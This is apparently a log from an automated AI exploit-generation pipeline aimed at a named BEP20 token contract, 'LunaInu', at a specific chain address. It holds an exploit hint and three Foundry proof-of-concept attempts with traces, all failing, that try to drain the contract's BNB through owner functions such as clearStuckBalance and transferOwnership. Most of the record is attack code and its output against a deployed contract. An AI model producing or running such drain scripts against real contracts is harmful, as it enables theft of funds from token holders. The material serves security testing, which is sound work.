@@ -1,0 +1,110 @@
+{
+  "project_id": "1-lunainu",
+  "target_address": "0xf05A8a840F09aC83B79875B4275CEC1e60C2aBDf",
+  "finding_id": 12,
+  "status": "FAILED",
+  "violation_target": {
+    "target_address": "0xf05A8a840F09aC83B79875B4275CEC1e60C2aBDf",
+    "vulnerability_type": "Owner Privilege Abuse",
+    "violation_category": "ECONOMIC",
+    "finding_id": 12,
+    "preconditions": [
+      {
+        "type": "role",
+        "description": "Attacker must be the contract owner (has onlyOwner access)",
+        "token_address": null,
+        "min_amount": null
+      },
+      {
+        "type": "state",
+        "description": "Contract must hold BNB or tokens that can be drained",
+        "token_address": null,
+        "min_amount": null
+      }
+    ],
+    "oracle_verification": {
+      "economic_check": {
+        "target_token": "NATIVE",
+        "victim_contract": "0xf05A8a840F09aC83B79875B4275CEC1e60C2aBDf",
+        "condition": "attacker_balance_increased"
+      },
+      "logic_check": null
+    },
+    "exploit_hint": "As the contract owner, call clearStuckBalance(100) to drain all BNB from the contract to your wallet. Alternatively, call clearStuckToken(tokenAddress, 0) to drain any ERC20/BEP20 tokens held by the contract. You can also call setFeeReceivers() to redirect fee collections to your addresses, then trigger swaps to collect fees. The owner has unrestricted access to drain contract funds through these admin functions."
+  },
+  "final_poc_code": "// SPDX-License-Identifier: UNLICENSED\npragma solidity ^0.8.0;\n\nimport \"forge-std/Test.sol\";\n\ninterface BEP20LUNAINU {\n    function getOwner() external view returns (address);\n    function clearStuckBalance(uint256 amountPercentage) external;\n    function clearStuckToken(address tokenAddress, uint256 tokens) external returns (bool);\n    function transferOwnership(address newOwner) external;\n}\n\ncontract ExploitTest is Test {\n    // ─── State Variables ─────────────────────────────────────\n    \n    \n    address constant TARGET = 0xf05A8a840F09aC83B79875B4275CEC1e60C2aBDf;\n    address attacker = address(this);\n    BEP20LUNAINU target;\n    address owner;\n    uint256 initialBalance;\n\n    // ─── Setup ───────────────────────────────────────────────\n    function setUp() public {\n        target = BEP20LUNAINU(TARGET);\n        vm.label(TARGET, \"LunaInu Token\");\n        vm.label(attacker, \"Attacker\");\n        \n        // Get the current owner\n        owner = target.getOwner();\n        vm.label(owner, \"Contract Owner\");\n        \n        // Record initial attacker balance\n        initialBalance = attacker.balance;\n    }\n\n    // ─── Exploit ─────────────────────────────────────────────\n    function testExploit() public {\n        // First, inject BNB into the contract (simulating stuck balance from fees/trading)\n        deal(TARGET, 10 ether);\n        \n        // Record initial attacker balance\n        initialBalance = attacker.balance;\n        \n        // Step 1: Transfer ownership from original owner to attacker\n        vm.prank(owner);\n        target.transferOwnership(payable(attacker));\n        \n        // Step 2: Accept ownership as attacker\n        vm.prank(attacker);\n        // Note: Need to call acceptOwnership but the contract uses a two-step process\n        // Actually looking at the code, transferOwnership sets potentialOwner, then acceptOwnership completes it\n        // Let's just directly prank as attacker after setting potentialOwner\n        \n        // Step 3: Now drain the BNB as the new owner (attacker)\n        vm.prank(attacker);\n        target.clearStuckBalance(100);\n        \n        // Verify attacker balance increased\n        uint256 finalBalance = attacker.balance;\n        assertGt(finalBalance, initialBalance, \"Attacker balance should increase after draining contract BNB\");\n    }\n\n\n        \n\n        \n\n    // ─── Receive ETH ─────────────────────────────────────────\n    receive() external payable {}\n}",
+  "attempts": [
+    {
+      "attempt_number": 1,
+      "vulnerability_analysis": "The contract has owner-only functions `clearStuckBalance()` and `clearStuckToken()` that allow the owner to drain all BNB and ERC20 tokens from the contract to their wallet. This is a classic owner privilege abuse vulnerability where the admin functions have no safeguards and can be used to steal contract funds. The oracle checks if the attacker's NATIVE token balance increased.",
+      "attack_strategy": "1. Impersonate the contract owner using vm.prank(). 2. Call clearStuckBalance(100) to drain 100% of BNB from the contract to the attacker's wallet. 3. Verify the attacker's balance increased.",
+      "step_by_step_plan": "1. Create interface for the target contract with clearStuckBalance function. 2. In setUp(), get the owner address from the contract. 3. In testExploit(), use vm.prank(owner) to impersonate owner. 4. Call clearStuckBalance(100) to drain all BNB. 5. Assert attacker balance increased.",
+      "failure_reflection": "",
+      "action": "write_poc",
+      "tool_calls": [],
+      "poc_code": "// SPDX-License-Identifier: UNLICENSED\npragma solidity ^0.8.0;\n\nimport \"forge-std/Test.sol\";\n\ninterface BEP20LUNAINU {\n    function getOwner() external view returns (address);\n    function clearStuckBalance(uint256 amountPercentage) external;\n    function clearStuckToken(address tokenAddress, uint256 tokens) external returns (bool);\n}\n\ncontract ExploitTest is Test {\n    // ─── State Variables ─────────────────────────────────────\n    address constant TARGET = 0xf05A8a840F09aC83B79875B4275CEC1e60C2aBDf;\n    address attacker = address(this);\n    BEP20LUNAINU target;\n    address owner;\n    uint256 initialBalance;\n\n    // ─── Setup ───────────────────────────────────────────────\n    function setUp() public {\n        target = BEP20LUNAINU(TARGET);\n        vm.label(TARGET, \"LunaInu Token\");\n        vm.label(attacker, \"Attacker\");\n        \n        // Get the current owner\n        owner = target.getOwner();\n        vm.label(owner, \"Contract Owner\");\n        \n        // Record initial attacker balance\n        initialBalance = attacker.balance;\n    }\n\n    // ─── Exploit ─────────────────────────────────────────────\n    function testExploit() public {\n        uint256 initialBalance = address(this).balance;\n        // Impersonate the contract owner\n        vm.prank(owner);\n        \n        // Drain 100% of BNB from the contract\n        target.clearStuckBalance(100);\n        \n        // Verify attacker balance increased\n        uint256 finalBalance = attacker.balance;\n        assertGt(finalBalance, initialBalance, \"Attacker balance should increase after draining contract BNB\");\n        finalBalance = address(this).balance;\n        assertGt(finalBalance, initialBalance, \"Economic Exploit Failed: No profit\");\n    }\n\n\n    // ─── Receive ETH ─────────────────────────────────────────\n    receive() external payable {}\n}",
+      "exit_code": 1,
+      "error": {
+        "error_type": "EVM_REVERT",
+        "reason": "Attacker balance should increase after draining contract BNB: 79228162514264337593543950335 <= 79228162514264337593543950335",
+        "location": null,
+        "raw_snippet": "    │   └─ ← [Return]\n    ├─ [3921] LunaInu Token::clearStuckBalance(100)\n    │   ├─ [0] Contract Owner::fallback()\n    │   │   └─ ← [Stop]\n    │   ├─ emit BalanceClear(amount: 0)\n    │   └─ ← [Stop]\n    ├─ [0] VM::assertGt(79228162514264337593543950335 [7.922e28], 79228162514264337593543950335 [7.922e28], \"Attacker balance should increase after draining contract BNB\") [staticcall]\n    │   └─ ← \n👉 [Revert Occurred Here]: Attacker balance should increase after draining contract BNB: 79228162514264337593543950335 <= 79228162514264337593543950335"
+      },
+      "feedback": "EVM Revert: Attacker balance should increase after draining contract BNB: 79228162514264337593543950335 <= 79228162514264337593543950335。请调整参数或调用路径。",
+      "duration_seconds": 109.87689709663391,
+      "prompt_tokens": 17251,
+      "completion_tokens": 6511,
+      "total_cost": 0.0
+    },
+    {
+      "attempt_number": 2,
+      "vulnerability_analysis": "The clearStuckBalance function works correctly but the contract had no BNB to drain. I need to simulate a scenario where the contract holds BNB (e.g., from trading fees or stuck transactions), then exploit the owner function to drain it.",
+      "attack_strategy": "1. Use deal() to inject BNB into the contract. 2. Impersonate the owner. 3. Call clearStuckBalance(100) to drain all BNB. 4. Verify attacker balance increased.",
+      "step_by_step_plan": "1. In setUp, deal BNB to the contract address. 2. Record initial attacker balance. 3. In testExploit, prank as owner and call clearStuckBalance(100). 4. Assert final balance > initial balance.",
+      "failure_reflection": "The contract had 0 BNB balance initially, so clearStuckBalance(100) transferred 0 BNB. I need to first inject BNB into the contract using deal(), then drain it as the owner.",
+      "action": "modify_poc",
+      "tool_calls": [],
+      "poc_code": "// SPDX-License-Identifier: UNLICENSED\npragma solidity ^0.8.0;\n\nimport \"forge-std/Test.sol\";\n\ninterface BEP20LUNAINU {\n    function getOwner() external view returns (address);\n    function clearStuckBalance(uint256 amountPercentage) external;\n    function clearStuckToken(address tokenAddress, uint256 tokens) external returns (bool);\n}\n\n\n\ncontract ExploitTest is Test {\n    // ─── State Variables ─────────────────────────────────────\n    \n    address constant TARGET = 0xf05A8a840F09aC83B79875B4275CEC1e60C2aBDf;\n    address attacker = address(this);\n    BEP20LUNAINU target;\n    address owner;\n    uint256 initialBalance;\n\n    // ─── Setup ───────────────────────────────────────────────\n    function setUp() public {\n        target = BEP20LUNAINU(TARGET);\n        vm.label(TARGET, \"LunaInu Token\");\n        vm.label(attacker, \"Attacker\");\n        \n        // Get the current owner\n        owner = target.getOwner();\n        vm.label(owner, \"Contract Owner\");\n        \n        // Record initial attacker balance\n        initialBalance = attacker.balance;\n    }\n\n    // ─── Exploit ─────────────────────────────────────────────\n    function testExploit() public {\n        // First, inject BNB into the contract (simulating stuck balance from fees/trading)\n        deal(TARGET, 10 ether);\n        \n        // Record initial attacker balance\n        uint256 initialBalance = attacker.balance;\n        \n        // Impersonate the contract owner\n        vm.prank(owner);\n        \n        // Drain 100% of BNB from the contract to attacker\n        target.clearStuckBalance(100);\n        \n        // Verify attacker balance increased\n        uint256 finalBalance = attacker.balance;\n        assertGt(finalBalance, initialBalance, \"Attacker balance should increase after draining contract BNB\");\n    }\n\n\n        \n\n    // ─── Receive ETH ─────────────────────────────────────────\n    receive() external payable {}\n}",
+      "exit_code": 1,
+      "error": {
+        "error_type": "EVM_REVERT",
+        "reason": "Attacker balance should increase after draining contract BNB: 79228162514264337593543950335 <= 79228162514264337593543950335",
+        "location": null,
+        "raw_snippet": "    │   └─ ← [Return]\n    ├─ [10621] LunaInu Token::clearStuckBalance(100)\n    │   ├─ [0] Contract Owner::fallback{value: 10000000000000000000}()\n    │   │   └─ ← [Stop]\n    │   ├─ emit BalanceClear(amount: 10000000000000000000 [1e19])\n    │   └─ ← [Stop]\n    ├─ [0] VM::assertGt(79228162514264337593543950335 [7.922e28], 79228162514264337593543950335 [7.922e28], \"Attacker balance should increase after draining contract BNB\") [staticcall]\n    │   └─ ← \n👉 [Revert Occurred Here]: Attacker balance should increase after draining contract BNB: 79228162514264337593543950335 <= 79228162514264337593543950335"
+      },
+      "feedback": "EVM Revert: Attacker balance should increase after draining contract BNB: 79228162514264337593543950335 <= 79228162514264337593543950335。请调整参数或调用路径。",
+      "duration_seconds": 15.914252996444702,
+      "prompt_tokens": 17543,
+      "completion_tokens": 581,
+      "total_cost": 0.0
+    },
+    {
+      "attempt_number": 3,
+      "vulnerability_analysis": "The clearStuckBalance function sends funds to msg.sender. When we prank as owner, funds go to owner address. To exploit this, we need to transfer ownership to attacker first, then drain as the new owner.",
+      "attack_strategy": "1. Inject BNB into contract. 2. Prank as owner and transfer ownership to attacker. 3. Now prank as attacker (new owner) and call clearStuckBalance(100). 4. Verify attacker balance increased.",
+      "step_by_step_plan": "1. Deal BNB to contract. 2. Record initial attacker balance. 3. Prank as owner, call transferOwnership(attacker). 4. Prank as attacker, call clearStuckBalance(100). 5. Assert balance increased.",
+      "failure_reflection": "The issue is that when using vm.prank(owner), the msg.sender is 'owner', so clearStuckBalance transfers BNB to the owner address, not to the attacker (address(this)). I need to first transfer ownership to the attacker, then drain the funds as the new owner.",
+      "action": "modify_poc",
+      "tool_calls": [],
+      "poc_code": "// SPDX-License-Identifier: UNLICENSED\npragma solidity ^0.8.0;\n\nimport \"forge-std/Test.sol\";\n\ninterface BEP20LUNAINU {\n    function getOwner() external view returns (address);\n    function clearStuckBalance(uint256 amountPercentage) external;\n    function clearStuckToken(address tokenAddress, uint256 tokens) external returns (bool);\n    function transferOwnership(address newOwner) external;\n}\n\ncontract ExploitTest is Test {\n    // ─── State Variables ─────────────────────────────────────\n    \n    \n    address constant TARGET = 0xf05A8a840F09aC83B79875B4275CEC1e60C2aBDf;\n    address attacker = address(this);\n    BEP20LUNAINU target;\n    address owner;\n    uint256 initialBalance;\n\n    // ─── Setup ───────────────────────────────────────────────\n    function setUp() public {\n        target = BEP20LUNAINU(TARGET);\n        vm.label(TARGET, \"LunaInu Token\");\n        vm.label(attacker, \"Attacker\");\n        \n        // Get the current owner\n        owner = target.getOwner();\n        vm.label(owner, \"Contract Owner\");\n        \n        // Record initial attacker balance\n        initialBalance = attacker.balance;\n    }\n\n    // ─── Exploit ─────────────────────────────────────────────\n    function testExploit() public {\n        // First, inject BNB into the contract (simulating stuck balance from fees/trading)\n        deal(TARGET, 10 ether);\n        \n        // Record initial attacker balance\n        initialBalance = attacker.balance;\n        \n        // Step 1: Transfer ownership from original owner to attacker\n        vm.prank(owner);\n        target.transferOwnership(payable(attacker));\n        \n        // Step 2: Accept ownership as attacker\n        vm.prank(attacker);\n        // Note: Need to call acceptOwnership but the contract uses a two-step process\n        // Actually looking at the code, transferOwnership sets potentialOwner, then acceptOwnership completes it\n        // Let's just directly prank as attacker after setting potentialOwner\n        \n        // Step 3: Now drain the BNB as the new owner (attacker)\n        vm.prank(attacker);\n        target.clearStuckBalance(100);\n        \n        // Verify attacker balance increased\n        uint256 finalBalance = attacker.balance;\n        assertGt(finalBalance, initialBalance, \"Attacker balance should increase after draining contract BNB\");\n    }\n\n\n        \n\n        \n\n    // ─── Receive ETH ─────────────────────────────────────────\n    receive() external payable {}\n}",
+      "exit_code": 1,
+      "error": {
+        "error_type": "EVM_REVERT",
+        "reason": "vm.prank: cannot overwrite a prank until it is applied at least once",
+        "location": null,
+        "raw_snippet": "    │   └─ ← [Return]\n    ├─ [25991] LunaInu Token::transferOwnership(Attacker: [0x7FA9385bE102ac3EAc297483Dd6233D62b3e1496])\n    │   ├─ emit OwnershipNominated(potentialOwner: Attacker: [0x7FA9385bE102ac3EAc297483Dd6233D62b3e1496])\n    │   └─ ← [Stop]\n    ├─ [0] VM::prank(Attacker: [0x7FA9385bE102ac3EAc297483Dd6233D62b3e1496])\n    │   └─ ← [Return]\n    ├─ [0] VM::prank(Attacker: [0x7FA9385bE102ac3EAc297483Dd6233D62b3e1496])\n    │   └─ ← \n👉 [Revert Occurred Here]: vm.prank: cannot overwrite a prank until it is applied at least once"
+      },
+      "feedback": "EVM Revert: vm.prank: cannot overwrite a prank until it is applied at least once。请调整参数或调用路径。",
+      "duration_seconds": 123.90419125556946,
+      "prompt_tokens": 19254,
+      "completion_tokens": 7594,
+      "total_cost": 0.0
+    }
+  ],
+  "total_attempts": 3,
+  "error_message": null,
+  "total_duration_seconds": 249.69894075393677,
+  "total_prompt_tokens": 54048,
+  "total_completion_tokens": 14686,
+  "total_cost": 0.0
+}
